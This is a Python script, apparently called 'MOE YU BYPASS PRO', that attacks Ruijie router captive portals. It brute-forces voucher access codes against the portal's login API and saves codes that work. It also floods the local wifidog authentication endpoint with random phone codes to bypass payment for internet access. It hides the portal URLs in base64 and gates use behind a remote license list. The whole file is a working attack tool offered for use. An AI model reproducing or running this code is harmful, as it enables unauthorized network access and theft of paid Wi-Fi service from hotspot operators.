import os
import re
import sys
import uuid
import time
import zlib
import json
import ping3
import base64
import random
import string
import urllib
import hashlib
import asyncio
import aiohttp
import requests
import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# Colors
w = "\033[1;37m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"
c = "\033[1;36m"

SUCCESS = 0
IN_RUNNING_ASCII_BIN = []
KEY_URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/main/key.txt"

def clear():
    os.system("clear")

def Line():
    print(f"{y}─" * os.get_terminal_size()[0])

def get_hwid():
    """ဖုန်းရဲ့ Unique ID ကို ထုတ်ယူခြင်း"""
    id_str = f"{os.getlogin()}:{uuid.getnode()}"
    return hashlib.md5(id_str.encode()).hexdigest().upper()

def Logo():
    clear()
    logo = f"""{r}
 ███▄           ▄████▄   ▓█████  ██   ██  ██   ██ 
 ▓██ ▀█▄       ▒██    ▀  ▓█   ▀  ▒██  ██▒ ▒██  ██▒
 ▓██  ▀█▄      ▒██       ▒███     ▒██ ██░  ▒██ ██░
 ░██   █▌      ▒██    ▄  ▒▓█  ▄   ░ ▐██▓░  ░ ▐██▓░
 ░██████░      ▒ ████▀   ░▒████▒  ░ ██▒▓░  ░ ██▒▓░
 ░ ▒▓ ▒ ░      ▒ ░ ▒ ░   ░░ ▒░ ░   ██▒▒▒    ██▒▒▒ 
 ░ ░▒ ░        ░  ▒       ░ ░  ░ ▓██ ░▒░  ▓██ ░▒░ 
   ░  ░      ░          ░    ▒ ▒ ░░   ▒ ▒ ░░  
     ░       ░ ░        ░  ░ ░ ░      ░ ░      ░  
{g}
         ── {w}MOE YU BYPASS PRO {g}──{w}"""
    print(logo)
    Line()
    print(f"{g}  [👤] {w}Dev      : {y}@moeyu")
    print(f"{g}  [🆔] {w}Your ID  : {c}{get_hwid()}")
    print(f"{g}  [🛡️] {w}Target   : {r}Ruijie Router Only")
    Line()

def check_key():
    """Key ရှိမရှိ GitHub မှာ စစ်ဆေးခြင်း"""
    my_id = get_hwid()
    Logo()
    print(f"{y}[*] Verifying License Control...{w}")
    try:
        res = requests.get(KEY_URL, timeout=10)
        if res.status_code == 200:
            if my_id in res.text:
                print(f"{g}[+] Access Granted! Welcome back.{w}")
                time.sleep(2)
                return True
            else:
                print(f"{r}[!] ACCESS DENIED!{w}")
                print(f"{y}[>] Your ID is not registered in our database.")
                print(f"{y}[>] Send your ID to Admin: {c}@moeyu{w}")
                sys.exit()
        else:
            print(f"{r}[!] Server Error! Code: {res.status_code}")
            sys.exit()
    except:
        print(f"{r}[!] Connection Error! Check your internet.")
        sys.exit()

async def get_session_id(session, session_url, prev_id):
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        async with session.get(session_url, headers=headers) as req:
            return re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url)).group(1)
    except: return prev_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try: self.ip = open(".ip", "r").read().strip()
        except: print(f"{r}[!] Run setup first!"); sys.exit()

    async def execute(self):
        Logo()
        print(f"{y}[*] Initializing Network Bypass...")
        async with aiohttp.ClientSession() as session:
            loop = 0
            while True:
                if loop % 5 == 0: sid = await get_session_id(session, self.session_url, None)
                await self.send_req(session, sid)
                await asyncio.sleep(1)
                loop += 1

    async def send_req(self, session, sid):
        code = "".join(random.choice(string.digits) for _ in range(6))
        try:
            async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params={'token': sid, 'phoneNumber': code}) as res:
                ping_st = await asyncio.to_thread(ping3.ping, 'google.com')
                ping_show = f"{g}{int(ping_st*1000)}ms" if ping_st else f"{r}Timeout"
                print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {g}{res.status}{w} | Ping: {ping_show}")
        except: pass

async def login_voucher(session, sid, voucher, file, debug):
    global SUCCESS
    url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3ZvdWNoZXIvP2xhbmc9ZW5fVVM=').decode()
    data = {"accessCode": voucher, "sessionId": sid, "apiVersion": 1}
    try:
        async with session.post(url, json=data) as req:
            resp = await req.text()
            if 'logonUrl' in resp:
                SUCCESS += 1
                print(f"{g}[+] SUCCESS: {voucher}{w}")
                open("success.txt", "a").write(f"{voucher}\n")
            elif debug: print(f"{r}[-] FAILED: {voucher}{w}")
            if any(x in resp for x in ['failed', 'expired', 'STA']):
                open(file, "a").write(f"{voucher}\n")
    except: pass

class VoucherCode:
    def __init__(self, mode, length, speed, tasks, debug):
        self.mode, self.length, self.speed, self.tasks, self.debug = mode, length, speed, tasks, debug
        self.file = f"failed_{mode}_{length}.txt"
        try: self.session_url = open(".session_url", "r").read().strip()
        except: print(f"{r}[!] Setup required."); sys.exit()

    async def start(self):
        Logo()
        print(f"{g}[+] Bruteforce Started | Mode: {self.mode} | Tasks: {self.tasks}{w}")
        Line()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=self.speed)) as session:
            loop = 0
            while True:
                if loop % 90 == 0: sid = await get_session_id(session, self.session_url, None)
                if self.mode == "digit":
                    v = str(random.randint(0, 10**self.length-1)).zfill(self.length)
                else:
                    chars = string.ascii_lowercase if "lower" in self.mode else (string.ascii_uppercase if "upper" in self.mode else string.ascii_letters)
                    v = "".join(random.choice(chars) for _ in range(self.length))
                
                await login_voucher(session, sid, v, self.file, self.debug)
                loop += 1

def feature():
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--option", choices=["code", "internet", "setup"], required=True)
    parser.add_argument("-m", "--mode", choices=["digit", "ascii-lower", "ascii-upper", "ascii-mix"], default="digit")
    parser.add_argument("-l", "--length", choices=[6, 7], type=int, default=6)
    parser.add_argument("-s", "--speed", type=int, default=100)
    parser.add_argument("-t", "--tasks", type=int, default=100)
    parser.add_argument("-d", "--debug", action="store_true")
    args = parser.parse_args()

    if args.option == "setup":
        Logo()
        try:
            res = requests.get("http://192.168.0.1", timeout=5).url
            gw = re.search('gw_address=(.*?)&', res).group(1)
            portal = requests.get(res).text
            sid_url = "https://portal-as.ruijienetworks.com" + re.search("href='(.*?)'</script>", portal).group(1)
            open(".session_url", "w").write(sid_url)
            open(".ip", "w").write(gw)
            print(f"{g}[+] Setup Success!{w}")
        except: print(f"{r}[!] Setup Failed. Connect to Ruijie WiFi.")
    elif args.option == "internet":
        asyncio.run(InternetAccess().execute())
    elif args.option == "code":
        v = VoucherCode(args.mode, args.length, args.speed, args.tasks, args.debug)
        asyncio.run(v.start())

if __name__ == "__main__":
    if check_key():
        try: feature()
        except KeyboardInterrupt: print(f"\n{r}[!] Stopped.{w}")
